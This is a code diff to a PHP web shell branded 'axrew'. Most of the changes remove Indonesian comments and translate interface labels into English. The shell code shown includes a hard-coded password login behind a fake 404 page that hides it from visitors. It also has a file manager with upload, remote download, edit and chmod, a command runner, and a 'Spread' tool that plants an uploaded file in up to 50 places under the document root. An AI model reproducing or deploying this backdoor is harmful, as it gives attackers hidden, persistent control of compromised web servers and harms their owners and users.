@@ -5,34 +5,27 @@ set_time_limit(0);
 error_reporting(0);
 ini_set('display_errors', FALSE);
 
-// ═══════════════════════════════════════════════
-//  LOGIN CONFIG — ganti password di sini
-// ═══════════════════════════════════════════════
-define('SHELL_PASS', 'axrew2025');   // <- ganti password
-define('SHELL_SESS', 'axrew_auth');  // session key
+define('SHELL_PASS', 'axrew2025');
+define('SHELL_SESS', 'axrew_auth');
 
 session_start();
 
-// ── Handle login POST ──
 if(isset($_POST['__login'])){
     if($_POST['__login'] === SHELL_PASS){
         $_SESSION[SHELL_SESS] = true;
         header('Location: '.$_SERVER['PHP_SELF']);
         exit;
     } else {
-        // Wrong password – tetap tampilkan 403
         $loginError = true;
     }
 }
 
-// ── Handle logout ──
 if(isset($_GET['__logout'])){
     session_destroy();
     header('Location: '.$_SERVER['PHP_SELF']);
     exit;
 }
 
-// ── Gate: belum login → tampilkan fake 403 ──
 if(empty($_SESSION[SHELL_SESS])){
     http_response_code(404);
     $srv  = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Apache/2.4.29 (Ubuntu)';
@@ -73,9 +66,6 @@ if(empty($_SESSION[SHELL_SESS])){
     ob_end_flush();
     exit;
 }
-// ═══════════════════════════════════════════════
-//  SHELL — kode asli di bawah ini
-// ═══════════════════════════════════════════════
 
 function perms($f){if(!file_exists($f))return '----';return substr(decoct(fileperms($f)),-4);}
 function fsize($f){if(!file_exists($f))return '0 B';if(is_dir($f))return 'DIR';$s=filesize($f);if($s>=1073741824)return round($s/1073741824,2).' GB';if($s>=1048576)return round($s/1048576,2).' MB';if($s>=1024)return round($s/1024,1).' KB';return $s.' B';}
@@ -482,7 +472,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
 .br{border-color:var(--r);color:var(--r);background:transparent;}.br:hover{background:var(--r);color:#fff;}
 .bfw{width:100%;justify-content:center;}
 .cmsg{color:var(--p);font-size:11px;line-height:1.7;margin-bottom:10px;opacity:.85;}
-/* SPREAD */
 .mbox.sp{max-width:500px;}
 .spread-info{font-size:10px;color:var(--d2);line-height:1.6;padding:8px 10px;margin-bottom:8px;background:var(--bg);border:1px solid var(--bd);border-radius:4px;border-left:2px solid var(--a);}
 .spread-log{margin-top:10px;background:var(--bg);border:1px solid var(--bd2);border-radius:4px;max-height:190px;overflow-y:auto;font-size:10px;}
@@ -500,7 +489,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
 .spread-stat{font-size:10px;color:var(--d2);margin-bottom:6px;min-height:14px;display:none;}
 .spread-stat b{color:var(--a);}
 .spread-stat.err b{color:var(--r);}
-/* COUNT */
 .count-row{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
 .count-row label{color:var(--d2);font-size:10px;white-space:nowrap;flex-shrink:0;}
 .count-input{width:64px;padding:6px 8px;background:var(--s3);border:1px solid var(--bd2);color:var(--p);border-radius:4px;font-family:var(--f);font-size:11px;outline:none;transition:border-color .1s;text-align:center;-moz-appearance:textfield;}
@@ -510,13 +498,11 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
 .count-slider{flex:1;-webkit-appearance:none;appearance:none;height:3px;background:var(--bd2);border-radius:2px;outline:none;cursor:pointer;}
 .count-slider::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:13px;height:13px;border-radius:50%;background:var(--a);cursor:pointer;border:2px solid var(--s1);transition:background .1s;}
 .count-slider::-moz-range-thumb{width:13px;height:13px;border-radius:50%;background:var(--a);cursor:pointer;border:2px solid var(--s1);}
-/* NOTIFY */
 #nw{position:fixed;bottom:12px;left:12px;z-index:9999;display:flex;flex-direction:column;gap:4px;pointer-events:none;}
 .nt{display:flex;align-items:center;gap:6px;padding:7px 12px;border-radius:4px;font-size:10px;font-weight:600;border-left:2px solid;box-shadow:0 2px 18px rgba(0,0,0,.7);transform:translateX(-120%);opacity:0;transition:transform .16s ease,opacity .16s ease;max-width:240px;}
 .nt.in{transform:translateX(0);opacity:1;}
 .nt.ok{background:rgba(8,8,18,.97);border-color:var(--a);color:var(--a);}
 .nt.err{background:rgba(16,4,4,.97);border-color:var(--r);color:var(--r);}
-/* LOGOUT btn */
 .logout-btn{
   margin-left:auto;display:flex;align-items:center;gap:5px;
   padding:0 12px;height:100%;
@@ -534,7 +520,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
 <body>
 <div class="shell">
 
-<!-- HEADER -->
 <div class="hdr">
   <div class="hdr-top">
     <div class="logo">axrew</div>
@@ -626,7 +611,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
 </div>
 <div id="nw"></div>
 
-<!-- UPLOAD -->
 <div class="ov" id="m-upload">
   <div class="mbox">
     <div class="mhd"><div class="mttl"><i class="fas fa-upload"></i> Upload File</div><button class="mx" onclick="closeM('upload')">&times;</button></div>
@@ -638,7 +622,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- REMOTE -->
 <div class="ov" id="m-remote">
   <div class="mbox">
     <div class="mhd"><div class="mttl"><i class="fas fa-cloud-download-alt"></i> Remote Download</div><button class="mx" onclick="closeM('remote')">&times;</button></div>
@@ -652,7 +635,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- NEW FILE -->
 <div class="ov" id="m-newfile">
   <div class="mbox">
     <div class="mhd"><div class="mttl"><i class="fas fa-file"></i> New File</div><button class="mx" onclick="closeM('newfile')">&times;</button></div>
@@ -663,7 +645,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- NEW DIR -->
 <div class="ov" id="m-newdir">
   <div class="mbox">
     <div class="mhd"><div class="mttl"><i class="fas fa-folder-plus"></i> New Directory</div><button class="mx" onclick="closeM('newdir')">&times;</button></div>
@@ -674,7 +655,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- EDIT -->
 <div class="ov" id="m-edit">
   <div class="mbox w">
     <div class="mhd"><div class="mttl" id="editT"><i class="fas fa-edit"></i> Edit</div><button class="mx" onclick="closeM('edit')">&times;</button></div>
@@ -685,7 +665,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- CHMOD -->
 <div class="ov" id="m-chmod">
   <div class="mbox">
     <div class="mhd"><div class="mttl"><i class="fas fa-key"></i> Chmod</div><button class="mx" onclick="closeM('chmod')">&times;</button></div>
@@ -696,7 +675,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- RENAME -->
 <div class="ov" id="m-rename">
   <div class="mbox">
     <div class="mhd"><div class="mttl"><i class="fas fa-pencil-alt"></i> Rename</div><button class="mx" onclick="closeM('rename')">&times;</button></div>
@@ -707,7 +685,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- CONFIRM -->
 <div class="ov" id="m-confirm">
   <div class="mbox">
     <div class="mhd"><div class="mttl"><i class="fas fa-exclamation-triangle"></i> Confirm</div><button class="mx" onclick="closeM('confirm')">&times;</button></div>
@@ -718,7 +695,6 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
     </div>
   </div>
 </div>
-<!-- SPREAD -->
 <div class="ov" id="m-spread">
   <div class="mbox sp">
     <div class="mhd">
@@ -738,10 +714,10 @@ html,body{height:100%;background:var(--bg);color:var(--p);font-family:var(--f);f
         </div>
         <div id="spRootHint" style="font-size:9.5px;color:var(--d2);margin-bottom:8px;padding:0 2px;min-height:13px;"></div>
         <div class="count-row">
-          <label><i class="fas fa-layer-group" style="margin-right:4px;opacity:.6"></i>Jumlah file:</label>
+          <label><i class="fas fa-layer-group" style="margin-right:4px;opacity:.6"></i>Count:</label>
           <input type="number" id="sp-count" class="count-input" value="5" min="1" max="50">
           <input type="range"  id="sp-slider" class="count-slider" value="5" min="1" max="50">
-          <span class="count-hint" id="sp-count-hint">5 file — max 50</span>
+          <span class="count-hint" id="sp-count-hint">5 files — max 50</span>
         </div>
         <input type="file" name="file" id="sp-file" class="mi" style="color:var(--d2)">
         <div class="spread-prog" id="spProg"><div class="spread-prog-bar" id="spBar"></div></div>
@@ -998,13 +974,12 @@ function runCmd(){
   });
   $('#tinp').val('');
 }
-/* SPREAD */
 var DOCROOT_PHP = '<?= addslashes(isset($_SERVER["DOCUMENT_ROOT"]) ? rtrim($_SERVER["DOCUMENT_ROOT"],"/") : "") ?>';
 function syncCount(src){
   var v=parseInt(src.value,10); if(isNaN(v)||v<1) v=1; if(v>50) v=50; src.value=v;
   if(src.id==='sp-count') document.getElementById('sp-slider').value=v;
   else document.getElementById('sp-count').value=v;
-  document.getElementById('sp-count-hint').innerHTML=(v===1?'1 file':v+' file')+' — max 50';
+  document.getElementById('sp-count-hint').innerHTML=(v===1?'1 file':v+' files')+' — max 50';
 }
 $(document).on('input','#sp-count',  function(){ syncCount(this); });
 $(document).on('input','#sp-slider', function(){ syncCount(this); });
@@ -1012,7 +987,7 @@ function spUseCWD(){ $('#sp-root').val(CWD); $('#spRootHint').html('<i class="fa
 function spUseDocRoot(){ var dr=DOCROOT_PHP||CWD; $('#sp-root').val(dr); $('#spRootHint').html('<i class="fas fa-check-circle" style="color:var(--a);margin-right:3px"></i>Set to document root: <span style="color:var(--a)">'+he(dr)+'</span>'); }
 function closeSpread(){
   closeM('spread'); $('#spreadForm')[0].reset(); $('#sp-root').val(''); $('#sp-count').val(5); $('#sp-slider').val(5);
-  $('#sp-count-hint').html('5 file — max 50'); $('#spRootHint').html(''); $('#spLog').hide(); $('#spLogItems').html('');
+  $('#sp-count-hint').html('5 files — max 50'); $('#spRootHint').html(''); $('#spLog').hide(); $('#spLogItems').html('');
   $('#spLogCount').text(''); $('#spStat').hide().text(''); $('#spProg').hide(); $('#spBar').css('width','0%');
   $('#spBtn').prop('disabled',false).html('<i class="fas fa-broadcast-tower"></i> Spread Now');
 }
